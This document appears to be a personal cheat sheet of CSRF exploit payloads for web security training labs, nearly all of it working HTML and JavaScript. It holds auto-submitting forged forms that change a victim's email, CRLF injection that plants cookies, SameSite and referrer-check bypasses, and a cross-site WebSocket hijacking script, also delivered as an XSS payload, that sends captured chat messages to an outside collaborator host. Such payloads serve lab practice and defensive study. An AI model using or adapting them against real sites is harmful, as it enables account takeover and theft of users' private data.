# CSRF

## CSRF Basic

```html
<html>
  <body>
    <form action="https://<your-lab-id>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;asdf" />
      <input type="hidden" name="csrf" value="Sva13Y6L5p53RX36TctucnIF9uidTLQ1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF when validation depends on method

```html
<html>
  <body>
    <form action="https://<your-lab-id>/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;asdf" />
      <input type="hidden" name="csrf" value="Sva13Y6L5p53RX36TctucnIF9uidTLQ1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF when validation depends on parameter

```html
<html>
  <body>
    <form action="https://<your-lab-id>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;asdf" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF when token is not tied to user
 
### All you need to do is log in, go into developer tools and copy the current CSRF token

```html
<html>
  <body>
    <form action="https://<your-lab-id>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;asdf" />
      <input type="hidden" name="csrf" value="dv8v5Gdv5Lf2zec2BoIKTKmkvDdRj4bw" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF when token is tied to non-session cookie

```html
<html>
  <body>
    <form action="https://<your-lab-id>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;asdf" />
      <input type="hidden" name="csrf" value="8jKJhpk3fHoEPQgFAYt4xHaeC7aLvT1R" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://<your-lab-id>/?search=test%0d%0aSet-Cookie:%20csrfKey=SQ4BFfEbxcLoK5Y07lSf9vVbHw7QaI3r%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

## CSRF when token is duplicated in cookie 

```html
<html>
  <body>
    <form action="https://<your-lab-id>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;asdf" />
      <input type="hidden" name="csrf" value="YOWwenYebAJYEkOdN7yrXZEZbzjzRFxN" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://<your-lab-id>/?search=test%0d%0aSet-Cookie:%20csrf=YOWwenYebAJYEkOdN7yrXZEZbzjzRFxN%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

## CSRF Samesite Lax bypass

### _method changes the method if allowed

```html
<html>
  <body>
    <form action="https://<your-lab-id>/my-account/change-email">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;asdf" />
      <input type="hidden" name="&#95;method" value="POST" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF SameSite strict via client open redirect

```html
<script>
    document.location = "https://<your-lab-id>/post/comment/confirmation?postId=../my-account/change-email?email=asdf%40asdf.asdf%26submit=1";
</script>
```

## CSRF SameSite Strict via sibling domain

### This lab uses cross-site websocket hijacking

```html
Connect to websocket script
<script>
    var ws = new WebSocket('wss://<your-lab-id>/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://<your-collaborator>', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>

    Used the second domain that was vulnerable to XSS to send in this script on exploit server
<script>
    document.location = "https://<your-second domain>/login?username=%3Cscript%3E+++++var+ws+%3D+new+WebSocket%28%27wss%3A%2F%2F<your-lab-id%2Fchat%27%29%3B+++++ws.onopen+%3D+function%28%29+%7B+++++++++ws.send%28%22READY%22%29%3B+++++%7D%3B+++++ws.onmessage+%3D+function%28event%29+%7B+++++++++fetch%28%27https%3A%2F%2F1y<your-collaborator>%27%2C+%7Bmethod%3A+%27POST%27%2C+mode%3A+%27no-cors%27%2C+body%3A+event.data%7D%29%3B+++++%7D%3B+%3C%2Fscript%3E&password=pas"
</script>
```

## CSRF bypass via cookie refresh
### Only works for SSO because SSO disables Lax for 2 minutes

```html
<html>
  <body>
    <form action="https://<your-lab-id>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      window.onclick = () => {
        window.open('https://<your-lab-id>/social-login');
      }
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF where referer header must be present

### meta tag removes the header

```html
<html>
<meta name="referrer" content="never"/>
  <body>
    <form action="https://<your-lab-id>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;asdf" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF with bad referer validation

- pushState sets what comes after first /
- Also I need to put: Referrer-Policy: unsafe-url in headers

```html
<html>
  <body>
    <form action="https://<your-lab-id>/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="asdf&#64;asdf&#46;asdf" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/csrf?<your-lab-id>');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
